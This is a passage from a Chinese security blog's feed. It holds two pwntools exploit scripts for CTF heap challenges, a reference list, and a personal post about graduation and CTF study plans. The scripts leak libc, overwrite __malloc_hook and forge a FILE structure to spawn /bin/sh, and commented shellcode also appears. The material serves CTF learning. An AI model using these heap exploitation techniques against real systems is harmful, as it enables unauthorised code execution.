class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-22 10:39:31</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"x86_64"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./babyheap"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></div><div class="line">ru(<span class="string">"Command:"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"Size: "</span>)</div><div class="line">sl(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,size,data)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line">ru(<span class="string">"Size: "</span>)</div><div class="line">sl(str(size))</div><div class="line">ru(<span class="string">"Content: "</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"Command: "</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"Index: "</span>)</div><div class="line">sl(str(index))</div><div class="line"></div><div class="line">add(<span class="number">0x20</span>) <span class="comment">#index0</span></div><div class="line">add(<span class="number">0x1e0</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index2</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index3</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free index1</span></div><div class="line"></div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x28</span>+<span class="string">"\x30"</span></div><div class="line"></div><div class="line">fill(<span class="number">0</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#index4</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free 1</span></div><div class="line">free(<span class="number">2</span>) <span class="comment">#free 2</span></div><div class="line"></div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line"></div><div class="line">dump(<span class="number">4</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">libc_bin_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line"><span class="comment"># bin_offset = 0x3a5678</span></div><div class="line">one_gadget_offset = <span class="number">0x4425a</span></div><div class="line">local_bin_offset = <span class="number">0x3C4C58</span></div><div class="line">libc_base = libc_bin_addr - local_bin_offset</div><div class="line">libc.address = libc_base</div><div class="line"></div><div class="line">one_gadget_addr = one_gadget_offset+libc_base</div><div class="line"></div><div class="line">malloc_offset = <span class="number">0x3C4BD0</span></div><div class="line">malloc_addr = malloc_offset + libc_base</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#change index 4 meta</span></div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>)</div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">free(<span class="number">4</span>)</div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>,libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"></div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></div><div class="line">payload = flat(<span class="string">"\x00"</span>*<span class="number">19</span>,one_gadget_addr)</div><div class="line">fill(<span class="number">4</span>,len(payload),payload)</div><div class="line">raw_input()</div><div class="line">add(<span class="number">0x90</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_bin_addr="</span>+hex(libc_bin_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"libc_base="</span>+hex(libc_base)</div><div class="line"><span class="keyword">print</span> <span class="string">"one_gadget_addr="</span>+hex(one_gadget_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"malloc_addr="</span>+hex(malloc_addr)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>exp2 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">context(log_level = <span class="string">"debug"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></div><div class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#5</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#6</span></div><div class="line">    free(<span class="number">1</span>)</div><div class="line">    free(<span class="number">2</span>)</div><div class="line"><span class="comment"># over lap</span></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p8(<span class="number">0xc0</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#1</span></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># leak heap</span></div><div class="line">    </div><div class="line">    free(<span class="number">5</span>)</div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x61</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    heap_addr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x120</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"heap_addr = "</span>+hex(heap_addr)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc</span></div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0xc1</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    <span class="comment">#raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x50)</span></div><div class="line">    </div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line">    main_area = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    libc_base = main_area - <span class="number">0x3a5678</span></div><div class="line">    </div><div class="line">    libc.address = libc_base</div><div class="line"></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x58</span>)<span class="comment">#7</span></div><div class="line">    alloc(<span class="number">0x30</span>)<span class="comment">#8</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#9</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#10</span></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x61</span>+<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">5</span>,<span class="string">"\x00"</span>*(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>+<span class="number">0x60</span>+<span class="number">0x40</span>))</div><div class="line"></div><div class="line">    free(<span class="number">6</span>)</div><div class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#4</span></div><div class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</div><div class="line">    <span class="comment"># print "b*"+hex(0x7CE9A+libc_base)</span></div><div class="line">    <span class="comment"># print util.proc.pidof(r)</span></div><div class="line"></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># unsorted bin attack </span></div><div class="line">    payload  = <span class="string">"\x00"</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>)+p64(main_area)+p64(libc_base+<span class="number">0x3A6040</span><span class="number">-0x10</span>)</div><div class="line">    payload  = payload.ljust(<span class="number">0x100</span><span class="number">-0x50</span>,<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line">    data = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x101</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</div><div class="line">    data = data.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">    data = data.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(heap_addr+<span class="number">0x30</span>*<span class="number">4</span>+<span class="number">0x10</span>+len(payload+data)<span class="number">-0x18</span>+<span class="number">8</span>)</div><div class="line">    data += p64(libc.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line">    </div><div class="line">    fill(<span class="number">4</span>,payload+data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line"></div><div class="line">    </div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># fill(2,p64(main_area)+p64(libc_base+0x3C5600-0x10))</span></div><div class="line"></div><div class="line">    <span class="comment"># print "IO_LIST="+hex(libc_base+0x3C5600)</span></div><div class="line">    <span class="comment"># alloc(0x58)#4</span></div><div class="line">    <span class="comment"># alloc(0x20)#7</span></div><div class="line">    <span class="comment"># alloc(0x20)#8</span></div><div class="line">    <span class="comment"># free(4)</span></div><div class="line">    </div><div class="line">    <span class="comment"># fill(3,p64(0)*5+p64(0x71))</span></div><div class="line">    <span class="comment"># fill(2, p64(libc.symbols['__malloc_hook']-0x23))</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x58)#9</span></div><div class="line">    <span class="comment"># alloc(0x58)</span></div><div class="line">    <span class="comment"># alloc(0x30)#10</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># payload  = '\x00'*3</span></div><div class="line">    <span class="comment"># payload += p64(0)*2</span></div><div class="line">    <span class="comment"># payload += p64(libc_base + 0x41374)</span></div><div class="line">    <span class="comment"># fill(6, payload)</span></div><div class="line"></div><div class="line">    <span class="comment"># alloc(255)</span></div><div class="line"></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    log.info(<span class="string">"For remote: %s HOST PORT"</span> % sys.argv[<span class="number">0</span>])</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</div><div class="line">        r = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</div><div class="line">        exploit(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = process([<span class="string">'./fastbin'</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">        </div><div class="line">        exploit(r)</div></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/104144.html</a> （Linux堆内存管理深入分析（上））<br><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="external">http://www.freebuf.com/articles/security-management/105285.html</a> （Linux堆内存管理深入分析（下））</p><p><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a> （浅析Linux堆溢出之fastbin）</p><p><a href="http://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="external">http://www.cnblogs.com/shangye/p/6268981.html</a> （ house of orange ）</p><p><a href="http://www.bitscn.com/network/hack/200607/30235.html" target="_blank" rel="external">http://www.bitscn.com/network/hack/200607/30235.html</a> （ FSO 利用 ）</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;涉及到的知识点&quot;&gt;&lt;a href=&quot;#涉及到的知识点&quot; class=&quot;headerlink&quot; title=&quot;涉及到的知识点&quot;&gt;&lt;/a&gt;涉及到的知识点&lt;/h3&gt;&lt;p&gt;1、fastbin attack&lt;/p&gt;
&lt;p&gt;2、unsorted bin attack&lt;/p&gt;
&lt;p&gt;3、malloc堆内存管理&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap" scheme="https://winter3un.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>墨色的五月</title>
    <link href="https://winter3un.github.io/2017/06/03/%E5%A2%A8%E8%89%B2%E7%9A%84%E4%BA%94%E6%9C%88/"/>
    <id>https://winter3un.github.io/2017/06/03/墨色的五月/</id>
    <published>2017-06-03T15:20:53.000Z</published>
    <updated>2017-10-21T06:54:15.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又是很久没更新博客了，毕竟我比较懒 = =。。。</p><p>这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。</p><p>最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。</p><p>比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。</p><p>总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。</p><p>1、 加强数据流量分析能力（应对铁人三项，参考科赛</p><p>2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习</p><a id="more"></a><p>一直以来喜欢低调，喜静，喜欢自己默默做自己的事情，可能与我自身性格有关吧。今后也同样如此，沉心静气。</p><h3 id="5月的碎碎念"><a href="#5月的碎碎念" class="headerlink" title="5月的碎碎念"></a>5月的碎碎念</h3><p>大学四年的最后一个月了，今后就要步入职场，而我基本上也完成了我进这所学院时的初衷，在这所大学建立一个安全团队，为对安全技术有兴趣的人提供一个平台（当然这些事，我一个人肯定是完成不了的，多亏了斯进老师一直以来的支持，最想感谢的人就是她啦）。大学这四年谈过一次恋爱，虽然短短3个月，不过至少这门必修课给我个及格分吧ORZ。做过一些科研，虽然很难去坚持做（毕竟懒癌晚期患者，没救了）。拿过一些比赛的最高名次，其实CTF比赛不难的，心态和运气才是关键（hhhhhhhh），接下来也要做一些ctf比赛的总结了（我竟然从没做过ORZ 。 说实话这个月在临安不用集合真的是太爽了= =。。。   也是到了该离开的时候了，团队已经带起来了，师弟们的实力都很棒（团队里都是男生，我也很绝望啊，期待有个对网络安全感兴趣的女生加入吧，女黑客ORZ）。今后的话，会一直对二进制进行研究，这是我的强项，虽然工作上可能web为主吧，不过无所谓了。</p><h3 id="一些未更新的wp"><a href="#一些未更新的wp" class="headerlink" title="一些未更新的wp"></a>一些未更新的wp</h3><p>1、cuit writeup （看下web题</p><p>2、0ctf writeup</p><p>3、堆溢出的总结</p><h3 id="一些计划"><a href="#一些计划" class="headerlink" title="一些计划"></a>一些计划</h3><p>1、刷完pwnable</p><p>2、刷完最近的web赛题</p><p>3、深入web代码审计</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;又是很久没更新博客了，毕竟我比较懒 = =。。。&lt;/p&gt;
&lt;p&gt;这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。&lt;/p&gt;
&lt;p&gt;最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。&lt;/p&gt;
&lt;p&gt;比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。&lt;/p&gt;
&lt;p&gt;总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。&lt;/p&gt;
&lt;p&gt;1、 加强数据流量分析能力（应对铁人三项，参考科赛&lt;/p&gt;
&lt;p&gt;2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习&lt;/p&gt;
    
    </summary>
    
    
      <category term="note" scheme="https://winter3un.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】2017-429final</title>
    <link href="https://winter3un.github.io/2017/04/27/2017-429-final/"/>
    <id>https://winter3un.github.io/2017/04/27/2017-429-final/</id>
    <published>2017-04-28T06:24:59.000Z</published>
    <updated>2017-04-29T05:16:31.000Z</updated>
    
